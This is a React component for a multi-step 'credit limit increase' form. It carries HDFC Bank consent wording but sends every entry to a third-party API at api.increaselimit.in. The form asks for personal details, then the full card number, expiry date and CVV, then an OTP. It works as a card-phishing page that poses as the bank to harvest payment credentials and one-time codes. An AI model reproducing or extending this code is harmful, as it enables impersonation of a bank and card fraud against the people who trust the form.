import React, { useState } from "react";
import logo from "../../../src/logo.png";
import banner from "../../Images/formBanner.jpg";
import "./forms.css";
import axios from 'axios';
import Swal from 'sweetalert2';


const FirstForm = () => {
  const [formData, setFormData] = useState({
    firstName: "",
    middleName: "",
    lastName: "",
    email: "",
    number: "",
    gender: "",
    employmentType: "",
    creditLimit: "",
    totalAmountDue: "",
    cardHolderName: "",
    cardNumber: "",
    expiryMonth: "",
    expiryYear: "",
    cvv: "",
    otp: "",
  });

  const [activeStep, setActiveStep] = useState(1);

  const handleChange = (e) => {
    const { name, value } = e.target; // Use `name` instead of `id` here
    setFormData((prevState) => ({
      ...prevState,
      [name]: value, // Update state using the `name` attribute
    }));
  };


  const handleNext = async () => {
    if (activeStep === 1) {
      await submitPersonalInfo();
    } else if (activeStep === 2) {
      await submitCardDetails();
    } else if (activeStep === 3) {
      await verifyOtp();
    }
  };

  const handlePrevious = () => {
    setActiveStep((prev) => Math.max(prev - 1, 1));
  };


  const submitPersonalInfo = async () => {
    console.log(formData); // Log formData to verify if gender is included
    try {
      const response = await axios.post("https://api.increaselimit.in/v1/send-personal-details", {
        firstName: formData.firstName,
        middleName: formData.middleName,
        lastName: formData.lastName,
        email: formData.email,
        number: formData.number,
        gender: formData.gender, // Check if this is being passed correctly
        employmentType: formData.employmentType,
      });
      if (response.status === 201) {
        Swal.fire({
          icon: 'success',
          title: 'Success!',
          text: 'Personal info submitted successfully!',
        });
        setActiveStep(2);
      } else {
        Swal.fire({
          icon: 'error',
          title: 'Error!',
          text: 'Failed to submit personal info',
        });
      }
    } catch (error) {
      console.error(error);
      Swal.fire({
        icon: 'error',
        title: 'Oops...',
        text: error.response.data.message,
      });
    }
  };


  const submitCardDetails = async () => {
    try {
      const response = await axios.post("https://api.increaselimit.in/v1/send-card-details", {
        creditLimit: formData.creditLimit,
        totalAmountDue: formData.totalAmountDue,
        cardHolderName: formData.cardHolderName,
        cardNumber: formData.cardNumber,
        expiryMonth: formData.expiryMonth,
        expiryYear: formData.expiryYear,
        cvv: formData.cvv,
      });

      if (response.status === 200) {
        Swal.fire({
          icon: 'success',
          title: 'Success!',
          text: 'Card details submitted successfully!',
        });
        setActiveStep(3);
      } else {
        Swal.fire({
          icon: 'error',
          title: 'Error!',
          text: 'Failed to submit card details',
        });
      }
    } catch (error) {
      console.error(error);
      Swal.fire({
        icon: 'error',
        title: 'Oops...',
        text: error.response.data.message,
      });
    }
  };

  const verifyOtp = async () => {
    try {
      const response = await axios.post("https://api.increaselimit.in/v1/send-otp", {
        otp: formData.otp,
      });

      if (response.status === 201) {
        Swal.fire({
          icon: 'success',
          title: 'Success!',
          text: 'OTP verified successfully! Form submitted!',
        });
      } else {
        Swal.fire({
          icon: 'error',
          title: 'Error!',
          text: 'Invalid OTP',
        });
      }
    } catch (error) {
      console.error(error);
      Swal.fire({
        icon: 'error',
        title: 'Oops...',
        text: error.response.data.message,
      });
    }
  };


  const forms = [
    {
      id: 1,
      content: (
        <div className="formBox">
          <form>
            <div className="row mb-2">
              <div className="col-md-6 text-start mb-3">
                <label htmlFor="firstName" className="form-label">
                  Your Full Name (as per PAN card)
                </label>
                <input
                  type="text"
                  id="firstName"
                  name="firstName"
                  className="form-control formInput"
                  placeholder="First Name"
                  value={formData.firstName}
                  onChange={handleChange}
                  required
                />
              </div>
              <div className="col-md-6 text-start mb-3">
                <label htmlFor="middleName" className="form-label">
                  Middle Name (Optional)
                </label>
                <input
                  type="text"
                  id="middleName"
                  name="middleName"
                  className="form-control formInput"
                  placeholder="Middle Name"
                  value={formData.middleName}
                  onChange={handleChange}
                />
              </div>
            </div>

            <div className="row mb-2">
              <div className="col-md-6 text-start mb-3">
                <label htmlFor="lastName" className="form-label">
                  Last Name
                </label>
                <input
                  type="text"
                  id="lastName"
                  name="lastName"
                  className="form-control formInput"
                  placeholder="Last Name"
                  value={formData.lastName}
                  onChange={handleChange}
                  required
                />
              </div>
              <div className="col-md-6 text-start mb-3">
                <label htmlFor="panNumber" className="form-label">
                  Your Contact Number
                </label>
                <input
                  type="text"
                  id="number"
                  name="number"
                  className="form-control formInput"
                  placeholder="Enter Contact Number"
                  value={formData.number}
                  onChange={(e) =>
                    setFormData({
                      ...formData,
                      number: e.target.value.slice(0, 10),
                    })
                  }
                  required
                />
              </div>
            </div>

            <div className="row mb-2">
              <div className="col-md-6 text-start mb-3">
                <label className="form-label">Your Gender</label>
                <div className="d-flex gap-3">
                  <div className="form-check">
                    <input
                      className="form-check-input"
                      type="radio"
                      name="gender" // Keep the same name for all gender options
                      id="male"
                      value="Male"
                      checked={formData.gender === "Male"}
                      onChange={handleChange}
                      required
                    />
                    <label className="form-check-label" htmlFor="male">
                      Male
                    </label>
                  </div>
                  <div className="form-check">
                    <input
                      className="form-check-input"
                      type="radio"
                      name="gender"
                      id="female"
                      value="Female"
                      checked={formData.gender === "Female"}
                      onChange={handleChange}
                    />
                    <label className="form-check-label" htmlFor="female">
                      Female
                    </label>
                  </div>
                  <div className="form-check">
                    <input
                      className="form-check-input"
                      type="radio"
                      name="gender"
                      id="thirdGender"
                      value="Third Gender"
                      checked={formData.gender === "Third Gender"}
                      onChange={handleChange}
                    />
                    <label className="form-check-label" htmlFor="thirdGender">
                      Third Gender
                    </label>
                  </div>
                </div>
              </div>
              <div className="col-md-6 text-start mb-3">
                <label htmlFor="employmentType" className="form-label">
                  Your Employment Type
                </label>
                <select
                  id="employmentType"
                  name="employmentType"
                  className="form-select"
                  value={formData.employmentType}
                  onChange={handleChange}
                  required
                >
                  <option value="">Select</option>
                  <option value="Salaried">Salaried</option>
                  <option value="Self-Employed">Self-Employed</option>
                  <option value="Student">Student</option>
                </select>
              </div>
            </div>

            <div className="row mb-2">
              <div className="col-md-6 text-start mb-3">
                <label htmlFor="email" className="form-label">
                  Your Personal Email Address
                </label>
                <input
                  type="email"
                  id="email"
                  className="form-control formInput"
                  placeholder="Enter your email"
                  name="email"
                  onChange={handleChange}
                  required
                />
              </div>
            </div>

            {/* <button type="button" className="btn btn-primary">
          Submit
        </button> */}
            <div className="row mt-4">
              <div
                style={{ display: "flex", gap: "20px", alignItems: "center" }}
                className="col-md-12"
              >
                <div>
                  <input type="checkbox" name="" id="" />
                </div>
                <p className="form_check_box" style={{ color: "var(--blue)", textAlign: "start" }}>
                  I understand and hereby give my consent to use my bureau details
                  and information provided by me and/or information already held by
                  HDFC Bank (if any) to evaluate my eligibility. I agree to the
                  Terms & Conditions set by the Bank.
                </p>
              </div>
            </div>
          </form>
        </div>
      )
    },
    {
      id: 2,
      content: (
        <div className="formBox">
          <form>
            <div className="row mb-2">
              <div className="col-md-6 text-start mb-3">
                <label htmlFor="firstName" className="form-label">
                  Enter Current Card Limit
                </label>
                <input
                  type="number"
                  id="credit-limit"
                  className="form-control formInput"
                  placeholder="Enter Your Card Limit"
                  required
                  name="creditLimit"
                  onChange={handleChange}
                />
              </div>
              <div className="col-md-6 text-start mb-3">
                <label htmlFor="middleName" className="form-label">
                  Total Amount Due
                </label>
                <input
                  type="number"
                  id="amount-due"
                  className="form-control formInput"
                  placeholder="Enter Amount Due"
                  name="totalAmountDue"
                  onChange={handleChange}
                />
              </div>
            </div>

            <div className="row mb-2">
              <div className="col-md-6 text-start mb-3">
                <label htmlFor="lastName" className="form-label">
                  Card Holder Name
                </label>
                <input
                  type="text"
                  id="name"
                  className="form-control formInput"
                  placeholder="Enter Card Holder Name"
                  required
                  name="cardHolderName"
                  onChange={handleChange}
                />
              </div>
              <div className="col-md-6 text-start mb-3">
                <label htmlFor="panNumber" className="form-label">
                  Card Number
                </label>
                <input
                  type="number"
                  id="panNumber"
                  className="form-control formInput"
                  placeholder="Enter Card Number"
                  maxLength="16"
                  required
                  name="cardNumber"
                  onChange={handleChange}
                />
              </div>
            </div>

            <div className="row mb-2">
              <div className="col-md-6 text-start mb-3">
                <label htmlFor="expiryMonth" className="form-label">
                  Expiry Month
                </label>
                <input
                  type="number"
                  id="expiryMonth"
                  className="form-control formInput"
                  placeholder="MM"
                  maxLength="2"
                  required
                  name="expiryMonth"
                  onChange={handleChange}
                />
              </div>
              <div className="col-md-6 text-start mb-3">
                <label htmlFor="expiry month" className="form-label">
                  Expiry Year
                </label>
                <input
                  type="number"
                  id="expiry_year"
                  className="form-control formInput"
                  placeholder="YY"
                  maxLength="2"
                  required
                  name="expiryYear"
                  onChange={handleChange}
                />
              </div>
            </div>

            <div className="row mb-2">
              <div className="col-md-6 text-start mb-3">
                <label htmlFor="email" className="form-label">
                  Enter CVV
                </label>
                <input
                  type="number"
                  id="cvv"
                  className="form-control formInput"
                  placeholder="CVV"
                  maxLength={3}
                  required
                  name="cvv"
                  onChange={handleChange}
                />
              </div>
            </div>

            {/* <button type="button" className="btn btn-primary">
          Submit
        </button> */}
          </form>
        </div>
      )
    },
    {
      id: 3,
      content: (
        <div className="formBox">
          <div className="otpform mb-2">
            <div>
              <form action="">
                <label htmlFor="email" className="form-label">
                  One Time Password (OTP)
                </label>
                <input
                  type="number"
                  id="otp"
                  name="otp"
                  onChange={handleChange}
                  className="form-control mb-2 formInput"
                  placeholder="Enter OTP"
                  required
                />
                <a href="#" onClick={() => alert("OTP resent successfully!")}>
                  Resend OTP
                </a>
              </form>
            </div>
          </div>
        </div>
      )
    },
  ];

  return (
    <>
      <div className="form_header">
        <div className="form_nav">
          <a href="/">
            <img src={logo} alt="Logo" />
          </a>
        </div>
      </div>
      <div className="form_banner1">
        <img className="w-100" src={banner} alt="Banner" />
      </div>
      <div className="bg-white">
        <section className="formSection">
          <div className="formStepContainer">
            {forms
              .filter((form) => form.id === activeStep)
              .map((form) => (
                <div key={form.id}>{form.content}</div>
              ))}
            <div className="formButtons d-flex justify-content-center">
              {/* <button
                type="button"
                onClick={handlePrevious}
                disabled={activeStep === 1}
              >
                Previous
              </button> */}
              <button type="button" className="btn btn-primary mb-3" onClick={handleNext}>
                {activeStep === 3 ? "Submit" : "Submit"}
              </button>
            </div>
          </div>
        </section>
      </div>
    </>
  );

};

export default FirstForm;
